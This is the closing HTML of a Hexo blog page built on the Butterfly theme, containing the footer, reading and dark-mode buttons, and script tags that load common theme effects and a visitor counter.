id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By yk1ng</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
